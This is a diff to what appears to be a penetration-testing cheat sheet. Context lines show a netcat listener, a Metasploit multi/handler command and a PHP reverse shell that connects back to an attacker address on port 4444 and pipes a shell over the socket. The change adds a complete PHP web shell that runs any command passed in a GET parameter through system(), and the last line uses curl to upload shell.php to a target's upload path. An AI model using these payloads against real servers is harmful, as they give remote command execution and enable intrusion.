@@ -116,7 +116,7 @@ nc -lvnp 4444
 msfconsole -q -x "use multi/handler; set LHOST $MYIP; set LPORT 4444; run"
 
 ## Web
-[*] Shell
+[*] Reverse Shell
 <?php
     $lhost = "$MYIP";
     $lport = 4444;
@@ -127,6 +127,26 @@ msfconsole -q -x "use multi/handler; set LHOST $MYIP; set LPORT 4444; run"
         exec("sh <&3 >&3 2>&3");
         }
 ?>
+
+[*] Web Shell
+<html>
+<body style="background: black;color: whitesmoke;font-family: 'Fira Code', 'Consolas', 'Liberation Mono', 'Courier New', monospace;font-size: 15px;margin: 10px 0 0 18px;">
+<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
+    <input id="cmd" type="TEXT" name="cmd" autofocus size="80" value="<?php echo isset($_GET['cmd']) ? htmlentities($_GET['cmd']) : ''; ?>" style="outline: none; background: inherit;border: none;font-size: 16px;color: inherit;font-family: inherit;font-weight: 800;">
+</form>
+<pre>
+<?php
+    if(isset($_GET['cmd']))
+    {system($_GET['cmd'] . ' 2>&1');}
+?>
+</pre>
+<script>
+    var cmdElement = document.getElementById('cmd');
+    cmdElement.focus();
+    cmdElement.setSelectionRange(cmdElement.value.length, cmdElement.value.length);
+</script>
+</body>
+</html>
 
 [*] File Upload
 curl --upload-file shell.php http://$TARGET:80/upload/
